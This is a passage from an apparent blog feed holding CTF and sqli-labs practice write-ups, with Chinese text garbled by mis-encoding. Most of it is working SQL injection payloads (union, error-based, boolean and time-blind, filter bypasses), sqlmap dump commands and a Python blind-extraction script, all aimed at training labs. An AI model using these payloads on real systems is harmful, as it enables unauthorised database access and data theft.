class="line">    return &#39;&#39;.join(chr(x ^ ord(line[x]) ^ ord(key[::-1][x]) ^ ord(key2[x])) for x in range(len(line)))</span><br><span class="line"></span><br><span class="line">file &#x3D; open(&quot;&#x2F;app&#x2F;flag&quot;, &quot;r&quot;)</span><br><span class="line">flag &#x3D; file.read()</span><br><span class="line">flag &#x3D; flag[:42]</span><br><span class="line"></span><br><span class="line">app.config[&#39;flag&#39;] &#x3D; encode(flag, &#39;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#39;, &#39;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#39;)</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br></pre></td></tr></table></figure>è§£å¯†è¿™ä¸ªå¾—åˆ°flagã€‚</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;å¼ºç½‘æ¯-2019-Upload&quot;&gt;&lt;a href=&quot;#å¼ºç½‘æ¯-2019-Upload&quot; class=&quot;headerlink&quot; title=&quot;[å¼ºç½‘æ¯ 2019]Upload&quot;&gt;&lt;/a&gt;[å¼ºç½‘æ¯ 2019]Upload&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;ä»£ç å®¡è®¡ï¼Œååºåˆ—åŒ–&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ä»£ç å®¡è®¡çœŸçš„å¤´ç–¼ï¼Œå¤ªéš¾äº†ã€‚&lt;br&gt;è¿›å…¥é¡µé¢æœ‰ä¸ªç™»é™†æ¡†ï¼Œæ³¨å†Œç™»é™†ï¼Œæœ‰ä¸ªä¸Šä¼ é¡µé¢ï¼Œè¯•äº†ä¸Šä¼ webshellæ— æœï¼Œçœ‹cookieæ˜¯ä¸€æ®µç¼–ç ï¼Œè§£ç ä¹‹åæ˜¯åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²ï¼Œè‚¯å®šå°±æ˜¯ååºåˆ—åŒ–äº†ï¼Œæ‰«åå°å‘ç°&lt;strong&gt;&lt;a href=&quot;http://www.tar.gz&quot;&gt;www.tar.gz&lt;/a&gt;&lt;/strong&gt;ï¼Œä¸‹è½½ä¸‹æ¥ï¼Œå®¡è®¡æºç ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
    
    
      <category term="ååºåˆ—åŒ–" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>sqli_labsé€šå…³è®°å½•ï¼ˆäºŒï¼‰</title>
    <link href="http://yoursite.com/2020/08/03/sqli-labs-2/"/>
    <id>http://yoursite.com/2020/08/03/sqli-labs-2/</id>
    <published>2020-08-03T14:27:33.000Z</published>
    <updated>2020-08-03T14:59:10.538Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Page-2-Adv-Injections"><a href="#Page-2-Adv-Injections" class="headerlink" title="Page-2 (Adv Injections)"></a>Page-2 (Adv Injections)</h1><h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>time-based blind:</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">?id&#x3D;1&#39;and if(ord(mid((select flag from ctftraining.flag),1,1))&gt;101,sleep(3),1) or &#39;</span><br></pre></td></tr></table></figure><h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>äºŒæ¬¡æ³¨å…¥</p><h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">?id&#x3D;1&#39; anandd 1&#x3D;1 anandd &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h2><p>boolean-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 anandd ascii(mid((select flag from ctftraining.flag),1,1))&gt;103 %23</span><br></pre></td></tr></table></figure><p>time-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1 anandd if(length(database())&gt;1,sleep(3),1) %23</span><br></pre></td></tr></table></figure><h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p>æŠ¥é”™æ³¨å…¥ï¼Œä¹‹å‰åšè¿‡çš„åŸé¢˜ï¼Œç©ºæ ¼è¿‡æ»¤ç”¨æ‹¬å·ä»£æ›¿ï¼Œor,andåŒå†™ç»•è¿‡ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;^updatexml(1,concat(0x7e,(select(right(flag,30))from(ctftraining.flag)),0x7e),1)^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><p>Boolean-based blind,è¿‡æ»¤æƒ…å†µå’Œ26ä¸€æ ·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;^ascii(mid((select(flag)from(ctftraining.flag)),1,1))&gt;102^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ³¨é‡Šç¬¦ï¼Œunion,select ä½¿ç”¨å¤§å°å†™ç»•è¿‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;%0aunIon%0aselEct%0a1,database(),3%0aor%0a&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h2><figure class="highlight plain"><figcaption><span>select```æŸ¥è¯¢ï¼Œå’Œ27ä¸€æ ·</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">?id&#x3D;0&quot;%0auniOn%0aseLecT%0a1,database(),3%0aor%0a&#39;1&#39;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>Boolean-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;||ascii(mid((selECt%0aflag%0afrom%0actftraining.flag),1,1))&gt;102^&#39;1&#39;&#x3D;&#39;0</span><br></pre></td></tr></table></figure><p>union select</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0%27)%0aunion%0aall%0aselect%0a1,(select%0aflag%0afrom%0actftraining.flag%0a%0alimit%0a0,1),3%0aor%0a(%271%27&#x3D;%270</span><br></pre></td></tr></table></figure><h2 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h2><p>Boolean-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;^ ascii(mid((select group_concat(flag) from ctftraining.flag),1,1))&gt;102 or &#39;1&#39;&#x3D;&#39;0</span><br></pre></td></tr></table></figure><h2 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h2><p>time-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1%27%20and%20(select(sleep(2-if(ord(mid((select flag from ctftraining.flag),1,1))&gt;102,0,2))))%20and%20%271%27&#x3D;%271</span><br></pre></td></tr></table></figure><h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>Boolean-based blind</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;and ord(mid((select flag from ctftraining.flag),1,1))&gt;101 and &quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><h2 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&quot;)and ord(mid((select flag from ctftraining.flag),1,1))&gt;101 and (&quot;1&quot;&#x3D;&quot;1</span><br></pre></td></tr></table></figure><h2 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h2><p>å®½å­—èŠ‚æ³¨å…¥ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27 union select 1,user(),3 -- +</span><br></pre></td></tr></table></figure><h2 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h2><p>å®½å­—èŠ‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1%df%27 union select 1,database(),3 -- +</span><br></pre></td></tr></table></figure><h2 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h2><p>å®½å­—èŠ‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname&#x3D;admin%df&#39; union select 1,(select flag from ctftraining.flag)%23&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure><h2 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1 union select 1,database(),3 -- +</span><br></pre></td></tr></table></figure><h2 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h2><p>å’Œ33ä¸€æ ·</p><h2 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h2><p>ä¸€æ ·</p><h2 id="less-38"><a href="#less-38" class="headerlink" title="less-38"></a>less-38</h2><p>ä¸€æ ·</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>å‡ åé“é¢˜éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ²¡ä»€ä¹ˆè¥å…»ï¼ŒæŒæ¡å‡ ä¸ªpayloadå°±å¯ä»¥ä¸€ç›´ç”¨ï¼Œä¹Ÿå­¦ä¸åˆ°ä»€ä¹ˆä¸œè¥¿ï¼Œåˆ·çš„æˆ‘å¥½ç´¯ï¼Œä¼‘æ¯ä¸€é˜µå­å†åˆ·åé¢çš„å§ã€‚</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Page-2-Adv-Injections&quot;&gt;&lt;a href=&quot;#Page-2-Adv-Injections&quot; class=&quot;headerlink&quot; title=&quot;Page-2 (Adv Injections)&quot;&gt;&lt;/a&gt;Page-2 (Adv Injections)&lt;/h1&gt;&lt;h2 id=&quot;less-23&quot;&gt;&lt;a href=&quot;#less-23&quot; class=&quot;headerlink&quot; title=&quot;less-23&quot;&gt;&lt;/a&gt;less-23&lt;/h2&gt;&lt;p&gt;time-based blind:&lt;/p&gt;
    
    </summary>
    
    
      <category term="sqlæ³¨å…¥" scheme="http://yoursite.com/categories/sql%E6%B3%A8%E5%85%A5/"/>
    
    
  </entry>
  
  <entry>
    <title>sqli_labsé€šå…³è®°å½•ï¼ˆä¸€ï¼‰</title>
    <link href="http://yoursite.com/2020/07/31/sqli-labs/"/>
    <id>http://yoursite.com/2020/07/31/sqli-labs/</id>
    <published>2020-07-31T09:03:26.000Z</published>
    <updated>2020-08-01T14:49:18.044Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]<br>æ—©å°±æƒ³åˆ·sqli_labsäº†ï¼Œè¿™å‡ å¤©æ­£å¥½æ²¡äº‹å¹²ï¼Œå­¦ä¹ ä¸€ä¸‹sqlæ³¨å…¥ï¼Œé¡ºä¾¿ç†Ÿæ‚‰ä¸€ä¸‹sqlmap<br>ç»ƒä¹ å¹³å°ï¼š<a href="https://buuoj.cn/challenges#sqli-labs">https://buuoj.cn/challenges#sqli-labs</a></p><a id="more"></a><h1 id="Page-1-Basic-Challenges"><a href="#Page-1-Basic-Challenges" class="headerlink" title="Page-1(Basic Challenges)"></a>Page-1(Basic Challenges)</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><h3 id="ä½¿ç”¨è”åˆæ³¨å…¥"><a href="#ä½¿ç”¨è”åˆæ³¨å…¥" class="headerlink" title="ä½¿ç”¨è”åˆæ³¨å…¥"></a>ä½¿ç”¨è”åˆæ³¨å…¥</h3><p>è¾“å…¥<code>id=1&#39;</code>,å‡ºç°æŠ¥é”™ä¿¡æ¯ã€‚<br><img src="/images/sqli_labs_page1/20200731-1.png" alt=""><br>è¾“å…¥<code>id=1&#39;%23</code>ï¼Œé¡µé¢æ¢å¤æ­£å¸¸ã€‚<br><img src="/images/sqli_labs_page1/20200731-2.png" alt=""><br>æµ‹è¯•è”åˆæŸ¥è¯¢ï¼Œå‘ç°æœ‰ä¸‰æ®µï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢æ•°æ®åº“åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23</span><br></pre></td></tr></table></figure><p><img src="/images/sqli_labs_page1/20200731-3.png" alt=""><br>æŸ¥è¯¢è¡¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;union select 1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39;),3%23</span><br></pre></td></tr></table></figure><p><img src="/images/sqli_labs_page1/20200731-4.png" alt=""><br>æŸ¥è¯¢åˆ—åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;union select 1,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;ctftraining&#39;),3%23</span><br></pre></td></tr></table></figure><p><img src="/images/sqli_labs_page1/20200731-5.png" alt=""><br>æŸ¥è¯¢å­—æ®µï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;-1&#39;union select 1,(select group_concat(flag) from ctftraining.flag),3%23</span><br></pre></td></tr></table></figure><p><img src="/images/sqli_labs_page1/20200731-6.png" alt=""></p><h3 id="ä½¿ç”¨æŠ¥é”™æ³¨å…¥"><a href="#ä½¿ç”¨æŠ¥é”™æ³¨å…¥" class="headerlink" title="ä½¿ç”¨æŠ¥é”™æ³¨å…¥"></a>ä½¿ç”¨æŠ¥é”™æ³¨å…¥</h3><p>ä½¿ç”¨<strong>updatexml</strong>å‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#æŸ¥è¯¢æ•°æ®åº“ï¼š</span><br><span class="line">id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e),1)%23</span><br><span class="line">#æŸ¥è¯¢è¡¨ï¼š</span><br><span class="line">?id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;ctftraining&#39;),0x7e),1)%23</span><br><span class="line">æŸ¥åˆ—åï¼š</span><br><span class="line">id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;ctftraining&#39;),0x7e),1)%23</span><br><span class="line">æŸ¥å­—æ®µï¼š</span><br><span class="line">id&#x3D;1&#39;||updatexml(1,concat(0x7e,(select group_concat(flag) from ctftraining.flag),0x7e),1)%23</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨sqlmap"><a href="#ä½¿ç”¨sqlmap" class="headerlink" title="ä½¿ç”¨sqlmap"></a>ä½¿ç”¨sqlmap</h3><p>å‚æ•°è¯´æ˜ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-u              æŒ‡å®šurl</span><br><span class="line">--batch         æ°¸è¿œä¸è¦è¦æ±‚ç”¨æˆ·è¾“å…¥ï¼Œä½¿ç”¨é»˜è®¤è¡Œä¸º</span><br><span class="line">--method        æŒ‡å®šè¯·æ±‚æ–¹æ³•(e.g. GET,POST)</span><br><span class="line">--dbs           åˆ—å‡ºæ•°æ®åº“å</span><br><span class="line">-D              æŒ‡å®šæ•°æ®åº“</span><br><span class="line">--tables        åˆ—å‡ºè¡¨å</span><br><span class="line">-T              æŒ‡å®šè¡¨å</span><br><span class="line">--columns       åˆ—å‡ºåˆ—å</span><br><span class="line">-C              æŒ‡å®šåˆ—å</span><br><span class="line">--dump          Dump DBMSæ•°æ®åº“è¡¨çš„æ¡ç›®</span><br><span class="line">--dump-all      Dump æ‰€æœ‰DBMSæ•°æ®åº“è¡¨çš„æ¡ç›®</span><br><span class="line">--current-db    æŸ¥è¯¢å½“å‰æ•°æ®åº“</span><br></pre></td></tr></table></figure><p>æŸ¥æ•°æ®åº“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --batch --method&#x3D;GET --dbs</span><br></pre></td></tr></table></figure><p>æŸ¥è¯¢è¡¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --batch --method&#x3D;GET -D ctftraining --tables</span><br></pre></td></tr></table></figure><p>æŸ¥åˆ—åï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qlmap -u &quot;http:&#x2F;&#x2F;19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --batch --method&#x3D;GET -D ctftraining -T flag --columns</span><br></pre></td></tr></table></figure><p>æŸ¥å­—æ®µï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;19d74227-be91-4963-9efb-1187a8c78bda.node3.buuoj.cn&#x2F;Less-1&#x2F;?id&#x3D;1&quot; --batch --method&#x3D;GET -D ctftraining -T flag -C &quot;flag&quot; --dump</span><br></pre></td></tr></table></figure><h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>å’Œ<strong>less-1</strong>ä¸€æ ·ï¼Œä¸ç”¨åŠ å•å¼•å·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0 union select 1,(select flag from ctftraining.flag),3%23</span><br></pre></td></tr></table></figure><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p><strong>less-1</strong>åŸºç¡€ä¸ŠåŠ ä¸ªæ‹¬å·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0&#39;) union select 1,(select flag from ctftraining.flag),3%23</span><br></pre></td></tr></table></figure><h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>æŠŠ<strong>less-3</strong>å•å¼•å·æ”¹ä¸ºåŒå¼•å·ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;0&quot;) union select 1,(select flag from ctftraining.flag),3%23</span><br></pre></td></tr></table></figure><h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><p>æ²¡æœ‰æ˜¾ç¤ºä½äº†ï¼Œè¾“å…¥å•å¼•å·æœ‰æŠ¥é”™ä¿¡æ¯ï¼Œè”åˆæ³¨å…¥ç”¨ä¸äº†äº†ï¼Œä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼Œä½¿ç”¨<strong>extractvalue</strong>å‡½æ•°ï¼Œ<br><strong>extractvalue</strong>å’Œ<strong>updatexml</strong>çš„ä¸åŒæ˜¯ï¼š<br>extractvalueéœ€è¦ä¸¤ä¸ªå‚æ•°ï¼Œè€Œupdatexmlæ˜¯éœ€è¦ä¸‰ä¸ªå‚æ•°ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;^(extractvalue(1,concat(0x7e,(database()),0x7e)))%23</span><br></pre></td></tr></table></figure><h2 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h2><p>ä½¿ç”¨æŠ¥é”™æ³¨å…¥ï¼ŒæŠŠ<strong>less-5</strong>ä¸­çš„å•å¼•å·æ”¹ä¸ºåŒå¼•å·ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&quot;^(extractvalue(1,concat(0x7e,(database()),0x7e)))%23</span><br></pre></td></tr></table></figure><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>è¿™ä¸ªä¸Šé¢å†™çš„æ˜¯ä½¿ç”¨<code>into ouutfile</code>ï¼Œä½†æˆ‘å¤ªèœäº†ï¼Œç”¨å¸ƒå°”ç›²æ³¨åšå‡ºæ¥çš„ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;) and 1&#x3D;1 and (&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>time-based blind:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;and (select 1 from (select(sleep(5-(if((length(database())&gt;0),0,5)))))x)%23</span><br><span class="line">id&#x3D;1&#39;and (select 5697 from (select(sleep(3-(if(ord(mid((select distinct(ifnull(cast(schema_name as nchar),0x20)) from information_schema.schemata limit 0,1),1,1))&gt;96,0,3)))))a) and &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>time-based blind:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def db_names():</span><br><span class="line">    db_name_list &#x3D; []</span><br><span class="line">    #db_num &#x3D; db_nums()</span><br><span class="line">    for n in range(int(db_num)):</span><br><span class="line">        db_name &#x3D; &quot;&quot;</span><br><span class="line">        i &#x3D;0</span><br><span class="line">        while(True):</span><br><span class="line">            i &#x3D; i + 1</span><br><span class="line">            low &#x3D; 32 </span><br><span class="line">            high &#x3D; 127</span><br><span class="line"></span><br><span class="line">            while(low &lt; high):</span><br><span class="line">                mid &#x3D; (low + high) &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">                sql_url &#x3D; &quot;http:&#x2F;&#x2F;a619f897-b4fe-43c3-801f-1f36f08010a0.node3.buuoj.cn&#x2F;Less-9&#x2F;&quot;</span><br><span class="line">                payload &#x3D; &quot;?id&#x3D;1&#39; and (select 1 from (select(sleep(3-(if(ord(mid((select distinct(ifnull(cast(schema_name as nchar), 0x20)) from information_schema.schemata limit &#123;&#125;,1),&#123;&#125;,1))&gt;&#123;&#125;,0,3)))))x) and &#39;1&#39;&#x3D;&#39;1&quot;.format(n,i,mid)</span><br><span class="line">                print(payload[4:])</span><br><span class="line">                url &#x3D; sql_url + payload</span><br><span class="line">                try:</span><br><span class="line">                    r &#x3D; requests.get(url&#x3D;url,timeout&#x3D;3)</span><br><span class="line">                    while(True):</span><br><span class="line">                        if r.status_code !&#x3D; 200:</span><br><span class="line">                            r &#x3D; requests.get(url&#x3D;url,timeout&#x3D;3)</span><br><span class="line">                        else:</span><br><span class="line">                            break</span><br><span class="line">                        print(r.status_code,url.split(&quot;&#x2F;&quot;)[-1])</span><br><span class="line">                    high &#x3D; mid</span><br><span class="line">                except:</span><br><span class="line">                    low &#x3D; mid + 1</span><br><span class="line">            if low !&#x3D; 32:</span><br><span class="line">                db_name +&#x3D; chr(low)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        db_name_list.append(db_name)</span><br><span class="line">        print(&quot;retrieved:&quot;,db_name_list[n])</span><br><span class="line">    print(&quot;available databases [&#123;&#125;]:&quot;.format(db_num))</span><br><span class="line">    for i in db_name_list:</span><br><span class="line">        print(&quot;[*]&quot;,i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    db_names()</span><br></pre></td></tr></table></figure><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>å’Œ<strong>less-9</strong>ä¸€æ ·ï¼Œå•å¼•å·æ”¹æˆåŒå¼•å·</p><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p>æŠ¥é”™æ³¨å…¥ï¼Œåªæ˜¾ç¤ºéƒ¨åˆ†å­—ç¬¦ä½¿ç”¨<strong>trim</strong>æˆªå–æ‰å·²ç»å‡ºç°çš„éƒ¨åˆ†</p><figure class="highlight plain"><figcaption><span>from b)```ï¼Œå°†å­—ç¬¦ä¸² B ä¸­çš„ A éƒ¨åˆ†åˆ å»ï¼Œè¿”å›å‰©ä½™éƒ¨åˆ†</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">æŸ¥æ•°æ®åº“ï¼š</span><br><span class="line">admin&#39;||updatexml(1,concat(0x7e,trim(&quot;ctftraining,information_schema,&quot; from (select group_concat(schema_name) from information_schema.schemata)),0x7e),1)%23</span><br><span class="line">æŸ¥æ•°æ®ï¼š</span><br><span class="line">admin&#39;||updatexml(1,concat(0x7e,trim(&#39;flag&#123;a51ea1de-a683-4fb1-a9aa-95&#39; from (select group_concat(flag) from ctftraining.flag)),0x7e),1)%23</span><br></pre></td></tr></table></figure><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xpsz&quot;) and (select 6059 from(select count(*),concat(0x7e,(select mid((ifnull(cast(schema_name as nchar),0x20)),1,54) </span><br><span class="line">from information_schema.schemata limit 